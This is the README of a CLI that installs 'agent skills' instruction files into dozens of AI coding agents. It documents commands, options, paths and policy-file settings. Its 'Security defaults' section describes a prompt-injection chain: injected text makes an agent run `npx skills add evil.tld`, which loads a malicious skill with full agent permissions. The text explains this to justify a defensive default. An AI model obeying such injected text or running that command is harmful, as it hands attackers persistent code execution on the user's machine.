# skills

The CLI for the open agent skills ecosystem.

<!-- agent-list:start -->

Supports **OpenCode**, **Claude Code**, **Codex**, **Cursor**, and [51 more](#supported-agents).

<!-- agent-list:end -->

[![skills.sh](https://skills.sh/b/vercel-labs/skills)](https://skills.sh/vercel-labs/skills)

## Install a Skill

```bash
npx skills add vercel-labs/agent-skills
```

### Source Formats

```bash
# GitHub shorthand (owner/repo)
npx skills add vercel-labs/agent-skills

# Full GitHub URL
npx skills add https://github.com/vercel-labs/agent-skills

# Direct path to a skill in a repo
npx skills add https://github.com/vercel-labs/agent-skills/tree/main/skills/web-design-guidelines

# GitLab URL
npx skills add https://gitlab.com/org/repo

# Any git URL
npx skills add git@github.com:vercel-labs/agent-skills.git

# Local path
npx skills add ./my-local-skills
```

### Options

| Option                    | Description                                                                                                                                        |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-g, --global`            | Install to user directory instead of project                                                                                                       |
| `-a, --agent <agents...>` | <!-- agent-names:start -->Target specific agents (e.g., `claude-code`, `codex`). See [Supported Agents](#supported-agents)<!-- agent-names:end --> |
| `-s, --skill <skills...>` | Install specific skills by name (use `'*'` for all skills)                                                                                         |
| `-l, --list`              | List available skills without installing                                                                                                           |
| `--copy`                  | Copy files instead of symlinking to agent directories                                                                                              |
| `-y, --yes`               | Skip all confirmation prompts                                                                                                                      |
| `--all`                   | Install all skills to all agents without prompts                                                                                                   |
| `--allow-well-known`      | Allow installing from a `.well-known/agent-skills` endpoint on an arbitrary HTTPS host. **Off by default**, see [Security defaults](#security-defaults).         |

### Examples

```bash
# List skills in a repository
npx skills add vercel-labs/agent-skills --list

# Install specific skills
npx skills add vercel-labs/agent-skills --skill frontend-design --skill skill-creator

# Install a skill with spaces in the name (must be quoted)
npx skills add owner/repo --skill "Convex Best Practices"

# Install to specific agents
npx skills add vercel-labs/agent-skills -a claude-code -a opencode

# Non-interactive installation (CI/CD friendly)
npx skills add vercel-labs/agent-skills --skill frontend-design -g -a claude-code -y

# Install all skills from a repo to all agents
npx skills add vercel-labs/agent-skills --all

# Install all skills to specific agents
npx skills add vercel-labs/agent-skills --skill '*' -a claude-code

# Install specific skills to all agents
npx skills add vercel-labs/agent-skills --agent '*' --skill frontend-design
```

### Installation Scope

| Scope       | Flag      | Location            | Use Case                                      |
| ----------- | --------- | ------------------- | --------------------------------------------- |
| **Project** | (default) | `./<agent>/skills/` | Committed with your project, shared with team |
| **Global**  | `-g`      | `~/<agent>/skills/` | Available across all projects                 |

### Installation Methods

When installing interactively, you can choose:

| Method                    | Description                                                                                 |
| ------------------------- | ------------------------------------------------------------------------------------------- |
| **Symlink** (Recommended) | Creates symlinks from each agent to a canonical copy. Single source of truth, easy updates. |
| **Copy**                  | Creates independent copies for each agent. Use when symlinks aren't supported.              |

## Other Commands

| Command                      | Description                                   |
| ---------------------------- | --------------------------------------------- |
| `npx skills list`            | List installed skills (alias: `ls`)           |
| `npx skills find [query]`    | Search for skills interactively or by keyword |
| `npx skills remove [skills]` | Remove installed skills from agents           |
| `npx skills update [skills]` | Update installed skills to latest versions    |
| `npx skills init [name]`     | Create a new SKILL.md template                |

### `skills list`

List all installed skills. Similar to `npm ls`.

```bash
# List all installed skills (project and global)
npx skills list

# List only global skills
npx skills ls -g

# Filter by specific agents
npx skills ls -a claude-code -a cursor
```

### `skills find`

Search for skills interactively or by keyword.

```bash
# Interactive search (fzf-style)
npx skills find

# Search by keyword
npx skills find typescript
```

### `skills update`

```bash
# Update all skills (interactive scope prompt)
npx skills update

# Update a single skill by name
npx skills update my-skill

# Update multiple specific skills
npx skills update frontend-design web-design-guidelines

# Update only global or project skills
npx skills update -g
npx skills update -p

# Non-interactive (auto-detects scope: project if in a project, else global)
npx skills update -y
```

| Option          | Description                                                               |
| --------------- | ------------------------------------------------------------------------- |
| `-g, --global`  | Only update global skills                                                 |
| `-p, --project` | Only update project skills                                                |
| `-y, --yes`     | Skip scope prompt (auto-detect: project if in a project dir, else global) |
| `[skills...]`   | Update specific skills by name instead of all                             |

### `skills init`

```bash
# Create SKILL.md in current directory
npx skills init

# Create a new skill in a subdirectory
npx skills init my-skill
```

### `skills remove`

Remove installed skills from agents.

```bash
# Remove interactively (select from installed skills)
npx skills remove

# Remove specific skill by name
npx skills remove web-design-guidelines

# Remove multiple skills
npx skills remove frontend-design web-design-guidelines

# Remove from global scope
npx skills remove --global web-design-guidelines

# Remove from specific agents only
npx skills remove --agent claude-code cursor my-skill

# Remove all installed skills without confirmation
npx skills remove --all

# Remove all skills from a specific agent
npx skills remove --skill '*' -a cursor

# Remove a specific skill from all agents
npx skills remove my-skill --agent '*'

# Use 'rm' alias
npx skills rm my-skill
```

| Option         | Description                                      |
| -------------- | ------------------------------------------------ |
| `-g, --global` | Remove from global scope (~/) instead of project |
| `-a, --agent`  | Remove from specific agents (use `'*'` for all)  |
| `-s, --skill`  | Specify skills to remove (use `'*'` for all)     |
| `-y, --yes`    | Skip confirmation prompts                        |
| `--all`        | Shorthand for `--skill '*' --agent '*' -y`       |

## What are Agent Skills?

Agent skills are reusable instruction sets that extend your coding agent's capabilities. They're defined in `SKILL.md`
files with YAML frontmatter containing a `name` and `description`.

Skills let agents perform specialized tasks like:

- Generating release notes from git history
- Creating PRs following your team's conventions
- Integrating with external tools (Linear, Notion, etc.)

Discover skills at **[skills.sh](https://skills.sh)**

## Supported Agents

Skills can be installed to any of these agents:

<!-- supported-agents:start -->

| Agent                                 | `--agent`                                | Project Path             | Global Path                     |
| ------------------------------------- | ---------------------------------------- | ------------------------ | ------------------------------- |
| AiderDesk                             | `aider-desk`                             | `.aider-desk/skills/`    | `~/.aider-desk/skills/`         |
| Amp, Kimi Code CLI, Replit, Universal | `amp`, `kimi-cli`, `replit`, `universal` | `.agents/skills/`        | `~/.config/agents/skills/`      |
| Antigravity                           | `antigravity`                            | `.agents/skills/`        | `~/.gemini/antigravity/skills/` |
| Augment                               | `augment`                                | `.augment/skills/`       | `~/.augment/skills/`            |
| IBM Bob                               | `bob`                                    | `.bob/skills/`           | `~/.bob/skills/`                |
| Claude Code                           | `claude-code`                            | `.claude/skills/`        | `~/.claude/skills/`             |
| OpenClaw                              | `openclaw`                               | `skills/`                | `~/.openclaw/skills/`           |
| Cline, Dexto, Warp                    | `cline`, `dexto`, `warp`                 | `.agents/skills/`        | `~/.agents/skills/`             |
| CodeArts Agent                        | `codearts-agent`                         | `.codeartsdoer/skills/`  | `~/.codeartsdoer/skills/`       |
| CodeBuddy                             | `codebuddy`                              | `.codebuddy/skills/`     | `~/.codebuddy/skills/`          |
| Codemaker                             | `codemaker`                              | `.codemaker/skills/`     | `~/.codemaker/skills/`          |
| Code Studio                           | `codestudio`                             | `.codestudio/skills/`    | `~/.codestudio/skills/`         |
| Codex                                 | `codex`                                  | `.agents/skills/`        | `~/.codex/skills/`              |
| Command Code                          | `command-code`                           | `.commandcode/skills/`   | `~/.commandcode/skills/`        |
| Continue                              | `continue`                               | `.continue/skills/`      | `~/.continue/skills/`           |
| Cortex Code                           | `cortex`                                 | `.cortex/skills/`        | `~/.snowflake/cortex/skills/`   |
| Crush                                 | `crush`                                  | `.crush/skills/`         | `~/.config/crush/skills/`       |
| Cursor                                | `cursor`                                 | `.agents/skills/`        | `~/.cursor/skills/`             |
| Deep Agents                           | `deepagents`                             | `.agents/skills/`        | `~/.deepagents/agent/skills/`   |
| Devin for Terminal                    | `devin`                                  | `.devin/skills/`         | `~/.config/devin/skills/`       |
| Droid                                 | `droid`                                  | `.factory/skills/`       | `~/.factory/skills/`            |
| Firebender                            | `firebender`                             | `.agents/skills/`        | `~/.firebender/skills/`         |
| ForgeCode                             | `forgecode`                              | `.forge/skills/`         | `~/.forge/skills/`              |
| Gemini CLI                            | `gemini-cli`                             | `.agents/skills/`        | `~/.gemini/skills/`             |
| GitHub Copilot                        | `github-copilot`                         | `.agents/skills/`        | `~/.copilot/skills/`            |
| Goose                                 | `goose`                                  | `.goose/skills/`         | `~/.config/goose/skills/`       |
| Hermes Agent                          | `hermes-agent`                           | `.hermes/skills/`        | `~/.hermes/skills/`             |
| Junie                                 | `junie`                                  | `.junie/skills/`         | `~/.junie/skills/`              |
| iFlow CLI                             | `iflow-cli`                              | `.iflow/skills/`         | `~/.iflow/skills/`              |
| Kilo Code                             | `kilo`                                   | `.kilocode/skills/`      | `~/.kilocode/skills/`           |
| Kiro CLI                              | `kiro-cli`                               | `.kiro/skills/`          | `~/.kiro/skills/`               |
| Kode                                  | `kode`                                   | `.kode/skills/`          | `~/.kode/skills/`               |
| MCPJam                                | `mcpjam`                                 | `.mcpjam/skills/`        | `~/.mcpjam/skills/`             |
| Mistral Vibe                          | `mistral-vibe`                           | `.vibe/skills/`          | `~/.vibe/skills/`               |
| Mux                                   | `mux`                                    | `.mux/skills/`           | `~/.mux/skills/`                |
| OpenCode                              | `opencode`                               | `.agents/skills/`        | `~/.config/opencode/skills/`    |
| OpenHands                             | `openhands`                              | `.openhands/skills/`     | `~/.openhands/skills/`          |
| Pi                                    | `pi`                                     | `.pi/skills/`            | `~/.pi/agent/skills/`           |
| Qoder                                 | `qoder`                                  | `.qoder/skills/`         | `~/.qoder/skills/`              |
| Qwen Code                             | `qwen-code`                              | `.qwen/skills/`          | `~/.qwen/skills/`               |
| Rovo Dev                              | `rovodev`                                | `.rovodev/skills/`       | `~/.rovodev/skills/`            |
| Roo Code                              | `roo`                                    | `.roo/skills/`           | `~/.roo/skills/`                |
| Tabnine CLI                           | `tabnine-cli`                            | `.tabnine/agent/skills/` | `~/.tabnine/agent/skills/`      |
| Trae                                  | `trae`                                   | `.trae/skills/`          | `~/.trae/skills/`               |
| Trae CN                               | `trae-cn`                                | `.trae/skills/`          | `~/.trae-cn/skills/`            |
| Windsurf                              | `windsurf`                               | `.windsurf/skills/`      | `~/.codeium/windsurf/skills/`   |
| Zencoder                              | `zencoder`                               | `.zencoder/skills/`      | `~/.zencoder/skills/`           |
| Neovate                               | `neovate`                                | `.neovate/skills/`       | `~/.neovate/skills/`            |
| Pochi                                 | `pochi`                                  | `.pochi/skills/`         | `~/.pochi/skills/`              |
| AdaL                                  | `adal`                                   | `.adal/skills/`          | `~/.adal/skills/`               |

<!-- supported-agents:end -->

> [!NOTE]
> **Kiro CLI users:** The default agent automatically loads skills from `.kiro/skills/` and `~/.kiro/skills/` — no
> configuration needed. If you use a **custom agent**, add skills to its `resources` in `.kiro/agents/<agent>.json`:
>
> ```json
> {
>   "resources": ["skill://.kiro/skills/**/SKILL.md"]
> }
> ```

The CLI automatically detects which coding agents you have installed. If none are detected, you'll be prompted to select
which agents to install to.

## Creating Skills

Skills are directories containing a `SKILL.md` file with YAML frontmatter:

```markdown
---
name: my-skill
description: What this skill does and when to use it
---

# My Skill

Instructions for the agent to follow when this skill is activated.

## When to Use

Describe the scenarios where this skill should be used.

## Steps

1. First, do this
2. Then, do that
```

### Required Fields

- `name`: Unique identifier (lowercase, hyphens allowed)
- `description`: Brief explanation of what the skill does

### Optional Fields

- `metadata.internal`: Set to `true` to hide the skill from normal discovery. Internal skills are only visible and
  installable when `INSTALL_INTERNAL_SKILLS=1` is set. Useful for work-in-progress skills or skills meant only for
  internal tooling.

```markdown
---
name: my-internal-skill
description: An internal skill not shown by default
metadata:
  internal: true
---
```

### Skill Discovery

The CLI searches for skills in these locations within a repository:

<!-- skill-discovery:start -->

- Root directory (if it contains `SKILL.md`)
- `skills/`
- `skills/.curated/`
- `skills/.experimental/`
- `skills/.system/`
- `.aider-desk/skills/`
- `.agents/skills/`
- `.augment/skills/`
- `.bob/skills/`
- `.claude/skills/`
- `.codeartsdoer/skills/`
- `.codebuddy/skills/`
- `.codemaker/skills/`
- `.codestudio/skills/`
- `.commandcode/skills/`
- `.continue/skills/`
- `.cortex/skills/`
- `.crush/skills/`
- `.devin/skills/`
- `.factory/skills/`
- `.forge/skills/`
- `.goose/skills/`
- `.hermes/skills/`
- `.junie/skills/`
- `.iflow/skills/`
- `.kilocode/skills/`
- `.kiro/skills/`
- `.kode/skills/`
- `.mcpjam/skills/`
- `.vibe/skills/`
- `.mux/skills/`
- `.openhands/skills/`
- `.pi/skills/`
- `.qoder/skills/`
- `.qwen/skills/`
- `.rovodev/skills/`
- `.roo/skills/`
- `.tabnine/agent/skills/`
- `.trae/skills/`
- `.windsurf/skills/`
- `.zencoder/skills/`
- `.neovate/skills/`
- `.pochi/skills/`
- `.adal/skills/`
<!-- skill-discovery:end -->

### Plugin Manifest Discovery

If `.claude-plugin/marketplace.json` or `.claude-plugin/plugin.json` exists, skills declared in those files are also discovered:

```json
// .claude-plugin/marketplace.json
{
  "metadata": { "pluginRoot": "./plugins" },
  "plugins": [
    {
      "name": "my-plugin",
      "source": "my-plugin",
      "skills": ["./skills/review", "./skills/test"]
    }
  ]
}
```

This enables compatibility with the [Claude Code plugin marketplace](https://code.claude.com/docs/en/plugin-marketplaces) ecosystem.

If no skills are found in standard locations, a recursive search is performed.

## Compatibility

Skills are generally compatible across agents since they follow a
shared [Agent Skills specification](https://agentskills.io). However, some features may be agent-specific:

| Feature         | OpenCode | OpenHands | Claude Code | Cline | CodeBuddy | Codex | Command Code | Kiro CLI | Cursor | Antigravity | Roo Code | Github Copilot | Amp | OpenClaw | Neovate | Pi  | Qoder | Zencoder |
| --------------- | -------- | --------- | ----------- | ----- | --------- | ----- | ------------ | -------- | ------ | ----------- | -------- | -------------- | --- | -------- | ------- | --- | ----- | -------- |
| Basic skills    | Yes      | Yes       | Yes         | Yes   | Yes       | Yes   | Yes          | Yes      | Yes    | Yes         | Yes      | Yes            | Yes | Yes      | Yes     | Yes | Yes   | Yes      |
| `allowed-tools` | Yes      | Yes       | Yes         | Yes   | Yes       | Yes   | Yes          | No       | Yes    | Yes         | Yes      | Yes            | Yes | Yes      | Yes     | Yes | Yes   | No       |
| `context: fork` | No       | No        | Yes         | No    | No        | No    | No           | No       | No     | No          | No       | No             | No  | No       | No      | No  | No    | No       |
| Hooks           | No       | No        | Yes         | Yes   | No        | No    | No           | Yes      | No     | No          | No       | No             | No  | No       | No      | No  | No    | No       |

## Troubleshooting

### "No skills found"

Ensure the repository contains valid `SKILL.md` files with both `name` and `description` in the frontmatter.

### Skill not loading in agent

- Verify the skill was installed to the correct path
- Check the agent's documentation for skill loading requirements
- Ensure the `SKILL.md` frontmatter is valid YAML

### Permission errors

Ensure you have write access to the target directory.

## Environment Variables

| Variable                  | Description                                                                |
| ------------------------- | -------------------------------------------------------------------------- |
| `INSTALL_INTERNAL_SKILLS` | Set to `1` or `true` to show and install skills marked as `internal: true` |
| `DISABLE_TELEMETRY`       | Set to disable anonymous usage telemetry                                   |
| `DO_NOT_TRACK`            | Alternative way to disable telemetry                                       |

```bash
# Install internal skills
INSTALL_INTERNAL_SKILLS=1 npx skills add vercel-labs/agent-skills --list
```

## Telemetry

This CLI collects anonymous usage data to help improve the tool. No personal information is collected.

Telemetry is automatically disabled in CI environments.

## Related Links

- [Agent Skills Specification](https://agentskills.io)
- [Skills Directory](https://skills.sh)
- [Amp Skills Documentation](https://ampcode.com/manual#agent-skills)
- [Antigravity Skills Documentation](https://antigravity.google/docs/skills)
- [Factory AI / Droid Skills Documentation](https://docs.factory.ai/cli/configuration/skills)
- [Claude Code Skills Documentation](https://code.claude.com/docs/en/skills)
- [OpenClaw Skills Documentation](https://docs.openclaw.ai/tools/skills)
- [Cline Skills Documentation](https://docs.cline.bot/features/skills)
- [CodeBuddy Skills Documentation](https://www.codebuddy.ai/docs/ide/Features/Skills)
- [Codex Skills Documentation](https://developers.openai.com/codex/skills)
- [Command Code Skills Documentation](https://commandcode.ai/docs/skills)
- [Crush Skills Documentation](https://github.com/charmbracelet/crush?tab=readme-ov-file#agent-skills)
- [Cursor Skills Documentation](https://cursor.com/docs/context/skills)
- [Firebender Skills Documentation](https://docs.firebender.com/multi-agent/skills)
- [Gemini CLI Skills Documentation](https://geminicli.com/docs/cli/skills/)
- [GitHub Copilot Agent Skills](https://docs.github.com/en/copilot/concepts/agents/about-agent-skills)
- [iFlow CLI Skills Documentation](https://platform.iflow.cn/en/cli/examples/skill)
- [Kimi Code CLI Skills Documentation](https://moonshotai.github.io/kimi-cli/en/customization/skills.html)
- [Kiro CLI Skills Documentation](https://kiro.dev/docs/cli/custom-agents/configuration-reference/#skill-resources)
- [Kode Skills Documentation](https://github.com/shareAI-lab/kode/blob/main/docs/skills.md)
- [OpenCode Skills Documentation](https://opencode.ai/docs/skills)
- [Qwen Code Skills Documentation](https://qwenlm.github.io/qwen-code-docs/en/users/features/skills/)
- [OpenHands Skills Documentation](https://docs.openhands.ai/modules/usage/how-to/using-skills)
- [Pi Skills Documentation](https://github.com/badlogic/pi-mono/blob/main/packages/coding-agent/docs/skills.md)
- [Qoder Skills Documentation](https://docs.qoder.com/cli/Skills)
- [Replit Skills Documentation](https://docs.replit.com/replitai/skills)
- [Roo Code Skills Documentation](https://docs.roocode.com/features/skills)
- [Trae Skills Documentation](https://docs.trae.ai/ide/skills)
- [Vercel Agent Skills Repository](https://github.com/vercel-labs/agent-skills)

## Security defaults

`skills add` is the entry point for executable content that an LLM agent
will subsequently load with full agent permissions. The CLI applies two
defenses by default and exposes a policy file for fleet admins.

### Well-known resolution is opt-in

`npx skills add` accepts bare HTTPS hostnames (e.g. `npx skills add example.com`)
and probes `https://<host>/.well-known/agent-skills/index.json` for a
catalog. **As of this version that probe is disabled by default.** The
attack chain it forecloses:

1. An LLM agent processes untrusted text (web page, email, doc, search result).
2. The text contains a prompt injection telling the agent to run
   `npx skills add evil.tld`.
3. The CLI resolves it via well-known, fetches `SKILL.md` from `evil.tld`.
4. On next activation, the agent loads the malicious skill with full agent
   permissions. Persistent indirect RCE.

To install from a well-known endpoint:

```bash
# Per-command:
npx skills add skills.acme.corp --allow-well-known

# Per-user (creates ~/.agents/skills-policy.json):
# { "version": 1, "providers": { ".well-known": "allow" } }
```

### Policy file (admin-managed)

The CLI loads a policy file from the first hit of:

1. `$SKILLS_POLICY` (absolute path)
2. `<cwd>/.skills-policy.json`
3. `~/.agents/skills-policy.json`

Schema:

```jsonc
{
  "version": 1,
  "default": "allow",               // applies to every provider unless overridden
  "providers": {                    // per-provider overrides
    ".well-known": "deny",          //   any of: "allow" | "deny" | "proxy_only"*
    "github":     "allow",
    "gitlab":     "allow",
    "git":        "deny",
    "local":      "allow"
  },
  "allow_sources": ["github.com/acme-corp/*"],
  "deny_sources": ["github.com/sketchy-org/*"],
  "mirror": {
    "url": "https://artifactory.corp/agent-skills",
    "providers": ["github", "gitlab", "git"]
  }
}
```

Evaluation precedence (first match wins):

1. `deny_sources` match  → deny
2. `allow_sources` match → allow
3. `providers[<id>]`      → cascade winner
4. `default`              → cascade winner
5. built-in default       → allow, except `.well-known` which is default-deny

Glob syntax: `*` matches any run of non-slash characters, `**` matches
anything. Source identifier format is `<host>/<owner>/<repo>` for hosted
providers, `<host><path>` for well-known, `local` for local paths.

### Mirror routing (`proxy_only`)

When a provider's effective rule is `proxy_only` AND `mirror` is configured
with that provider listed in `mirror.providers`, the CLI rewrites the source
URL before any clone or fetch:

```
github.com/vercel-labs/agent-skills
  →  https://artifactory.corp/agent-skills/github.com/vercel-labs/agent-skills
```

Path shape is `${mirror.url}/${originalHost}/${originalPath}` — the Go
GOPROXY model. Configure your Artifactory / Nexus / JFrog remote-VCS or
generic-remote repository to match.

`.well-known` cannot be `proxy_only`: it is the catch-all "any HTTPS host"
fallback and has no upstream identity to mirror. Policy load fails loudly
if you try.

For an air-gapped fleet pointed at an internal mirror that already filters
content, a one-liner policy suffices:

```jsonc
{ "version": 1, "default": "deny", "allow_sources": ["artifactory.corp/*"] }
```

### Inventory manifest (`~/.agents/skills-inventory.json`)

On every successful `add`, `remove`, and `update`, the CLI writes a
machine-readable record of installed skills to `~/.agents/skills-inventory.json`.
The format is stable and intended for fleet-management consumption (Intune
detection scripts, JAMF extension attributes, osquery, Munki, etc.):

```jsonc
{
  "version": 1,
  "updated_at": "2026-05-25T12:00:00Z",
  "skills": [
    {
      "name": "frontend-design",
      "source": "github.com/vercel-labs/agent-skills",
      "ref": "main",
      "scope": "global",
      "installed_at": "...",
      "provider_id": "github"
    }
  ]
}
```

Distinct from `skills-lock.json` (per-project, tracks resolution graph) —
the inventory is per-user-global and tracks effective installed state
across scopes.

## License

MIT
